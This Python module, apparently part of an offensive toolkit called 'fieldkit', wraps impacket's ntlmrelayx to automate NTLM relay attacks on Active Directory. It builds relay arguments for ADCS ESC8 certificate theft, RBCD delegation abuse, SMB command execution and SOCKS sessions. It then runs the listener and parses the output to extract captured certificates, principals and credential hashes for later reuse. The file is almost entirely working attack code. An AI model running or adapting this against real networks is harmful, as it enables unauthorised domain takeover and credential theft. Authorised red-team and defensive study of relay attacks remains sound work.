"""ntlmrelayx subprocess wrap — relay listener lifecycle + output parser.

D3 wraps impacket's `ntlmrelayx.py` (aka `impacket-ntlmrelayx`) as a
subprocess and gives the chain module a clean lifecycle:

  * :func:`find_tool` — where ntlmrelayx lives on PATH; None → falls
    back to a manual outcome in the chain (same graceful pattern as
    :mod:`fieldkit.coerce.petitpotam` in D2).
  * :class:`Listener` — the running subprocess handle. Encapsulates
    bind check, output tail, orderly stop.
  * :func:`start` — build the argv from a :class:`RelayTarget`
    (esc8: `--target http://<ca>/certsrv/certfnsh.asp --adcs --template
    DomainController`), spawn, wait for the bind confirmation line
    before returning.
  * :func:`wait_capture` — poll the listener's stdout for outcome
    signatures (cert acquired, cred acquired, cred failed) with a
    timeout; returns a :class:`RelayOutcome`.
  * :class:`RelayOutcome` — parsed from the listener's captured
    stdout. Carries the recovered credential and/or cert bytes so the
    chain module can persist them via
    :meth:`fieldkit.state.Store.add_certificate` /
    :meth:`add_credential`.

Deliberately no state persistence in this module — the relay module
owns the *live* listener and the *parsed* outcome; persisting the
outcome is the chain step's job so the two concerns stay separable
(easier to test the parser without a Store; easier to test the Store
without an ntlmrelayx dependency).
"""
import os
import re
import shutil
import signal
import tempfile
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from . import runner


#: PATH names for the impacket-ntlmrelayx binary, in preference order.
_TOOL_SEARCH_ORDER = ("impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx")


def find_tool(arsenal_hint=None):
    """Return the path to an ntlmrelayx binary, or None if none is on
    PATH (or under ``arsenal_hint``). Same shape as
    :func:`fieldkit.coerce.petitpotam.find_tool` so the chain can
    branch on tool availability uniformly."""
    for name in _TOOL_SEARCH_ORDER:
        p = shutil.which(name)
        if p:
            return p
    if arsenal_hint:
        for name in _TOOL_SEARCH_ORDER:
            p = os.path.join(arsenal_hint, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
    return None


#: What the relay listener actually does with a caught auth.
#:   ``adcs-cert``     — POST to an ADCS web-enrollment endpoint,
#:                       return a certificate for the coerced
#:                       principal (the esc8 chain uses this).
#:   ``ldap-rbcd``     — add msDS-AllowedToActOnBehalfOfOtherIdentity
#:                       on a workstation target (the rbcd profile,
#:                       D5).
#:   ``smb-exec``      — remote command exec on a target with SMB
#:                       signing disabled (the smb-relay-exec profile,
#:                       D5).
#:   ``socks``         — leave the relayed session in a SOCKS proxy
#:                       for post-ex tooling (rarely the plan, but
#:                       supported).
RELAY_MODES = frozenset({"adcs-cert", "ldap-rbcd", "smb-exec", "socks"})


@dataclass(frozen=True)
class RelayTarget:
    """What the listener does when a caught auth arrives.

    ``mode`` selects the argv flavor:
      * adcs-cert   → --target http://<host>/certsrv/certfnsh.asp
                       --adcs --template <template>
      * ldap-rbcd   → --target ldaps://<dc> --delegate-access
      * smb-exec    → --target smb://<host> -c <cmd>
      * socks       → --socks

    ``target`` is the destination service (CA host for adcs-cert, DC
    for ldap-rbcd, workstation for smb-exec). ``template`` is only
    used by adcs-cert; defaults to ``DomainController`` matching the
    esc8 canonical.
    """
    mode: str
    target: str
    template: str = "DomainController"
    extra_argv: tuple = ()

    def __post_init__(self):
        if self.mode not in RELAY_MODES:
            raise ValueError(
                f"RelayTarget.mode must be one of {sorted(RELAY_MODES)}, "
                f"got {self.mode!r}")


#: Bind confirmation and outcome signatures from ntlmrelayx stdout.
#: Kept as substrings (not full regex) so we survive minor version
#: shifts; the substrings picked are the ones impacket has kept
#: stable across the 0.11.x/0.12.x line I've tested.
_BIND_OK_SIGNATURES = (
    "Running in relay mode",
    "Setting up SMB Server",
    "Setting up HTTP Server",
)
_BIND_FAIL_SIGNATURES = (
    "Address already in use",
    "Permission denied",
    "socket.error",
)
_CAPTURE_CRED_SIGNATURES = (
    ("Authenticating against",   "cred-attempt"),
    ("SUCCESS! [+] Authenticating against",   "cred-ok"),
    ("[*] Authenticating against",   "cred-attempt"),
    ("SUCCESS",                  "cred-ok"),   # broad, checked after specifics
)
_CAPTURE_CERT_SIGNATURES = (
    ("Certificate successfully",  "cert-ok"),
    ("Base64 certificate",        "cert-ok"),
    ("PFX certificate",           "cert-ok"),
    ("Requesting certificate for", "cert-attempt"),
)
_CAPTURE_FAIL_SIGNATURES = (
    "STATUS_LOGON_FAILURE",
    "STATUS_ACCESS_DENIED",
    "SMB SessionError",
)


@dataclass
class Listener:
    """Live ntlmrelayx subprocess handle.

    Attributes:
      tool_bin: the resolved binary path (`impacket-ntlmrelayx` etc.)
      target:   the :class:`RelayTarget` this listener is set up for.
      port_smb: the SMB relay port the listener bound (ntlmrelayx
        defaults to 445, but that's rarely bindable as non-root; the
        chain step may want to pass --smb-port).
      listener_uri: the SMB URI the coerce primitive tells the target
        to authenticate to. Derived from the listener's bind address
        + port.
      proc:     the running subprocess.Popen. None until start().
      log_path: temp file containing ntlmrelayx's stdout/stderr —
        useful for post-mortem when the parser doesn't recognize
        the tool's output.
      captured_lines: rolling list of already-consumed stdout lines
        (for tests + `chain show` inline evidence).
    """
    tool_bin: str
    target: RelayTarget
    port_smb: int = 445
    port_http: int = 80
    bind_addr: str = "0.0.0.0"
    listener_ip: str = ""             # what to tell the coerce target
    listener_uri: str = ""
    # Deliberately typed as `object` — the concrete type is a
    # subprocess.Popen returned by fieldkit.runner.spawn, but we
    # can't import subprocess at module scope (architecture
    # invariant: only fieldkit.runner touches subprocess). Duck-typed
    # attribute access on the handle is all we need.
    proc: Optional[object] = None
    log_path: str = ""
    captured_lines: list = field(default_factory=list)
    _reader_thread: Optional[threading.Thread] = None

    @property
    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def stop(self, timeout=3.0):
        """Send SIGINT, then SIGKILL if the process doesn't exit
        within ``timeout``. Safe to call multiple times."""
        if not self.proc:
            return
        if self.proc.poll() is not None:
            return
        # subprocess.TimeoutExpired lives in the subprocess module —
        # we can't import it directly (architecture invariant), but
        # it's exposed on the proc handle's own module via .wait().
        # Catch by class name to avoid needing the import.
        try:
            self.proc.send_signal(signal.SIGINT)
            try:
                self.proc.wait(timeout=timeout)
            except Exception as exc:                        # noqa: BLE001
                # The only exception .wait(timeout=…) raises is
                # subprocess.TimeoutExpired — anything else is
                # unexpected and we still want the kill fallback.
                if "TimeoutExpired" not in type(exc).__name__:
                    raise
                self.proc.kill()
                self.proc.wait(timeout=timeout)
        finally:
            if self._reader_thread and self._reader_thread.is_alive():
                self._reader_thread.join(timeout=1.0)


#: Ordered outcome kinds — the more specific first-match wins, so a
#: 'cert-ok' outcome overrides a stray 'cred-attempt' that landed
#: before the certificate acquisition line.
RELAY_OUTCOME_KINDS = frozenset({
    "no-tool", "bind-fail",
    "cert-ok", "cred-ok", "cred-fail",
    "timeout", "error",
})


@dataclass(frozen=True)
class RelayOutcome:
    """The parsed result of one relay session.

    :attr:`kind` — one of :data:`RELAY_OUTCOME_KINDS`.
    :attr:`principal` — the coerced principal name recovered from the
        stdout (``CORP/DC01$`` etc.), empty string if the parser
        didn't recognize it.
    :attr:`cert_bytes` — the base64 or PFX certificate bytes, when
        ``kind == "cert-ok"``. Empty otherwise.
    :attr:`cred_hash` — the NTLM hash / SMB auth material recovered
        for ``kind == "cred-ok"``. Empty otherwise.
    :attr:`detail` — the tail of ntlmrelayx's stdout that produced
        this classification. Empty for `no-tool` and `bind-fail`.
    """
    kind: str
    principal: str = ""
    cert_bytes: str = ""
    cred_hash: str = ""
    detail: str = ""

    def __post_init__(self):
        if self.kind not in RELAY_OUTCOME_KINDS:
            raise ValueError(
                f"RelayOutcome.kind must be one of {sorted(RELAY_OUTCOME_KINDS)}, "
                f"got {self.kind!r}")


# ---------------------------------------------------------------- output classifier

_PRINCIPAL_RE = re.compile(
    r"authenticating against\s+\S+\s+as\s+(\S+)", re.IGNORECASE)
_B64_CERT_RE = re.compile(
    r"(?:Base64\s*certificate|PFX certificate)[^\n]*\n((?:[A-Za-z0-9+/=]{60,}\n?)+)")


def _classify_lines(lines):
    """Walk the captured stdout lines and return a :class:`RelayOutcome`.

    Order of precedence:
      1. cert-ok (esc8's happy path — a certificate was acquired)
      2. cred-ok (relay landed a credential, no cert)
      3. cred-fail (auth attempt happened but failed)
      4. error   (parser didn't recognize any outcome — surfaces for
                  diagnosis, doesn't crash the chain)

    The parser is deliberately optimistic: if ANY line matches a
    positive signature it wins, even if noise + errors surround it.
    An operator staring at chain output should see 'cert-ok' when
    even one certificate acquisition line appears in the tail.
    """
    text = "\n".join(lines)

    # cert-ok — the esc8 happy path
    for sig, kind in _CAPTURE_CERT_SIGNATURES:
        if sig in text and kind == "cert-ok":
            principal = ""
            m = _PRINCIPAL_RE.search(text)
            if m:
                principal = m.group(1)
            cert_bytes = ""
            m = _B64_CERT_RE.search(text)
            if m:
                cert_bytes = "".join(m.group(1).split())
            return RelayOutcome(kind="cert-ok", principal=principal,
                                 cert_bytes=cert_bytes, detail=text[-1024:])

    # cred-ok — landed a credential (relay to SMB/LDAP with auth)
    for sig, kind in _CAPTURE_CRED_SIGNATURES:
        if sig in text and kind == "cred-ok":
            principal = ""
            m = _PRINCIPAL_RE.search(text)
            if m:
                principal = m.group(1)
            return RelayOutcome(kind="cred-ok", principal=principal,
                                 detail=text[-1024:])

    # cred-fail — an auth was attempted but rejected
    for sig in _CAPTURE_FAIL_SIGNATURES:
        if sig in text:
            return RelayOutcome(kind="cred-fail", detail=text[-1024:])

    # Nothing recognized — surface the tail so the operator can
    # diagnose the parser gap.
    return RelayOutcome(kind="error", detail=text[-1024:])


def _saw_bind_ok(text):
    return any(sig in text for sig in _BIND_OK_SIGNATURES)


def _saw_bind_fail(text):
    return any(sig in text for sig in _BIND_FAIL_SIGNATURES)


# ---------------------------------------------------------------- argv builders

def _build_argv(tool_bin, target, port_smb, port_http, bind_addr):
    """Assemble the ntlmrelayx command line for the given target."""
    argv = [tool_bin, "-smb2support"]
    argv += ["--interface-ip", bind_addr]
    argv += ["--smb-port", str(port_smb),
             "--http-port", str(port_http)]
    if target.mode == "adcs-cert":
        argv += ["-t", f"http://{target.target}/certsrv/certfnsh.asp",
                 "--adcs", "--template", target.template]
    elif target.mode == "ldap-rbcd":
        argv += ["-t", f"ldaps://{target.target}", "--delegate-access"]
    elif target.mode == "smb-exec":
        argv += ["-t", f"smb://{target.target}"]
    elif target.mode == "socks":
        argv += ["--socks"]
    argv += list(target.extra_argv)
    return argv


# ---------------------------------------------------------------- start/stop

def start(target, listener_ip, port_smb=445, port_http=80,
          bind_addr="0.0.0.0", tool_bin=None, bind_wait=3.0,
          arsenal_hint=None):
    """Spawn ntlmrelayx and wait until it either signals bind success
    or bind failure. Returns a :class:`Listener` whose
    :attr:`listener_uri` is set to ``\\\\<listener_ip>\\anyshare``
    when bind succeeded.

    Failure modes:
      * tool not on PATH  → returns Listener with .proc = None and
        the caller checks find_tool separately (or we raise; the
        chain step branches on both shapes).
      * bind failed within `bind_wait` seconds → the returned
        Listener has .proc still holding the exited process; caller
        parses .captured_lines for the failure text.
    """
    tool = tool_bin or find_tool(arsenal_hint=arsenal_hint)
    if not tool:
        return Listener(
            tool_bin="", target=target,
            port_smb=port_smb, port_http=port_http,
            bind_addr=bind_addr, listener_ip=listener_ip)

    log_fd, log_path = tempfile.mkstemp(prefix="fk-relay-", suffix=".log")
    os.close(log_fd)

    argv = _build_argv(tool, target, port_smb, port_http, bind_addr)
    # runner.spawn is fieldkit's ONE long-running child-process
    # primitive (see fieldkit.runner module docstring). It uses
    # start_new_session=True internally so stop()'s SIGINT stays
    # confined to the child.
    proc = runner.spawn(argv)

    listener = Listener(
        tool_bin=tool, target=target,
        port_smb=port_smb, port_http=port_http,
        bind_addr=bind_addr, listener_ip=listener_ip,
        proc=proc, log_path=log_path)

    # Background reader — drains stdout into captured_lines + log
    # file so the caller can poll without blocking.
    def _drain():
        with open(log_path, "w") as log_fh:
            for line in proc.stdout:                          # type: ignore[union-attr]
                listener.captured_lines.append(line.rstrip("\n"))
                log_fh.write(line)
                log_fh.flush()
    reader = threading.Thread(target=_drain, daemon=True)
    reader.start()
    listener._reader_thread = reader

    # Wait for bind confirmation OR bind failure OR timeout.
    deadline = time.monotonic() + bind_wait
    while time.monotonic() < deadline:
        text = "\n".join(listener.captured_lines)
        if _saw_bind_ok(text):
            listener.listener_uri = rf"\\{listener_ip}\ANY"
            return listener
        if _saw_bind_fail(text):
            return listener       # caller sees .listener_uri == ""
        if proc.poll() is not None:
            return listener       # exited before signalling bind
        time.sleep(0.1)
    return listener               # timed out without bind confirmation


def wait_capture(listener, timeout=60.0, poll_interval=0.5):
    """Poll ``listener`` until it captures an outcome or ``timeout``
    elapses. Always returns a :class:`RelayOutcome`.

    Doesn't stop the listener — caller does that (usually right after
    this returns; the outcome is what matters, not the process).
    """
    if not listener.tool_bin:
        return RelayOutcome(kind="no-tool",
                             detail="no ntlmrelayx binary on PATH")
    if not listener.listener_uri:
        # start() came back without a bind confirmation
        return RelayOutcome(
            kind="bind-fail",
            detail="\n".join(listener.captured_lines[-40:]))

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        outcome = _classify_lines(listener.captured_lines)
        if outcome.kind in ("cert-ok", "cred-ok", "cred-fail"):
            return outcome
        if listener.proc is not None and listener.proc.poll() is not None:
            # process died before capture — reclassify with what we have
            return _classify_lines(listener.captured_lines)
        time.sleep(poll_interval)
    return RelayOutcome(kind="timeout",
                         detail="\n".join(listener.captured_lines[-40:]))
